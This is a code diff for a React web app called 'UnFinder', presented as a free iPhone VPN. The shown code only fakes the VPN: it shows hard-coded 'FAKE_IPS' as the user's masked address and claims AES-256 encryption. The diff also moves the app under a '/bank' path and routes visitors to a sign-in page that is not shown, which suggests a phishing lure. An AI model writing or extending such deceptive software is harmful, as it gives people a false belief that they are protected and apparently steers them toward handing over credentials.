@@ -1,17 +1,13 @@
-import { useState, useEffect } from 'react'
+﻿import { useState } from 'react'
 import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom'
 import SignIn from './routes/signIn.jsx'
 import './App.css'
 
-// ── Device detection ──────────────────────────────────────────────────────────
-const isIOS = () => /iphone|ipad|ipod/i.test(navigator.userAgent)
-const isAndroid = () => /android/i.test(navigator.userAgent)
 const isIPhone = () => /iphone/i.test(navigator.userAgent)
 const isStandalone = () =>
   window.navigator.standalone === true ||
   window.matchMedia('(display-mode: standalone)').matches
 
-// ── Location data ─────────────────────────────────────────────────────────────
 const LOCATIONS = [
   { city: 'New York',  country: 'United States', code: 'US', flag: '🇺🇸', ping: 12 },
   { city: 'London',    country: 'United Kingdom', code: 'GB', flag: '🇬🇧', ping: 28 },
@@ -26,7 +22,6 @@ const FAKE_IPS = {
   DE: '89.163.128.99', SG: '139.180.198.3', CA: '142.4.205.77',
 }
 
-// ── Install page (iPhone-only landing) ───────────────────────────────────────
 function InstallPage() {
   return (
     <div className="install-overlay">
@@ -40,26 +35,19 @@ function InstallPage() {
         </div>
         <h1 className="install-title">UnFinder</h1>
         <p className="install-sub">Mask your IP. Hide your location. Free, always.</p>
-
         <div className="install-steps">
           <p className="steps-label">INSTALL ON IPHONE</p>
           <div className="step-row"><span className="step-n">1</span><span>Tap <strong>Share</strong> <span className="chip">⬆️</span> in Safari</span></div>
           <div className="step-row"><span className="step-n">2</span><span>Tap <strong>Add to Home Screen</strong> <span className="chip">＋</span></span></div>
           <div className="step-row"><span className="step-n">3</span><span>Tap <strong>Add</strong> — done</span></div>
         </div>
-
-        <a className="install-done-btn" href="/">
-          ✓ I have installed it — Continue
-        </a>
-        <a className="install-skip-btn" href="/">
-          Skip, use in browser
-        </a>
+        <a className="install-done-btn" href="/bank/">✓ I have installed it — Continue</a>
+        <a className="install-skip-btn" href="/bank/">Skip, use in browser</a>
       </div>
     </div>
   )
 }
 
-// ── VPN App page ──────────────────────────────────────────────────────────────
 function VpnApp() {
   const [connected, setConnected]   = useState(false)
   const [connecting, setConnecting] = useState(false)
@@ -83,7 +71,6 @@ function VpnApp() {
       <div className={`bg-ring r1 ${connected ? 'active' : ''}`} />
       <div className={`bg-ring r2 ${connected ? 'active' : ''}`} />
       <div className={`bg-ring r3 ${connected ? 'active' : ''}`} />
-
       <div className="shell">
         <header className="header">
           <div className="wordmark">
@@ -96,7 +83,6 @@ function VpnApp() {
           </div>
           <div className={`status-dot ${connected ? 'on' : connecting ? 'pulse' : 'off'}`} />
         </header>
-
         <div className="ip-block">
           <p className="ip-label">Your IP Address</p>
           <p className={`ip-value ${connected ? 'masked' : ''}`}>
@@ -104,7 +90,6 @@ function VpnApp() {
           </p>
           {connected && <div className="ip-badge">🛡 Masked · {selected.city}</div>}
         </div>
-
         <div className="power-wrap">
           <button
             className={`power-btn ${connected ? 'on' : ''} ${connecting ? 'loading' : ''}`}
@@ -120,7 +105,6 @@ function VpnApp() {
             </span>
           </button>
         </div>
-
         <button className="location-trigger" onClick={() => setShowPicker(true)}>
           <span className="loc-flag">{selected.flag}</span>
           <span className="loc-name">{selected.city}</span>
@@ -129,7 +113,6 @@ function VpnApp() {
             <path d="M3 5l4 4 4-4" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
           </svg>
         </button>
-
         <div className={`stats-row ${connected ? 'visible' : ''}`}>
           <div className="stat"><div className="stat-val">AES-256</div><div className="stat-key">Encryption</div></div>
           <div className="stat-div" />
@@ -138,7 +121,6 @@ function VpnApp() {
           <div className="stat"><div className="stat-val">Free</div><div className="stat-key">Always</div></div>
         </div>
       </div>
-
       {showPicker && (
         <div className="sheet-overlay" onClick={() => setShowPicker(false)}>
           <div className="sheet" onClick={e => e.stopPropagation()}>
@@ -172,15 +154,13 @@ function VpnApp() {
   )
 }
 
-// ── Root ──────────────────────────────────────────────────────────────────────
 export default function App() {
-  // On iPhone (not standalone), land on /install — everywhere else, land on /
   const defaultRoute = isIPhone() && !isStandalone()
     ? <Navigate to="/install" replace />
     : <SignIn />
 
   return (
-    <Router>
+    <Router basename="/bank">
       <Routes>
         <Route path="/"        element={defaultRoute} />
         <Route path="/install" element={<InstallPage />} />
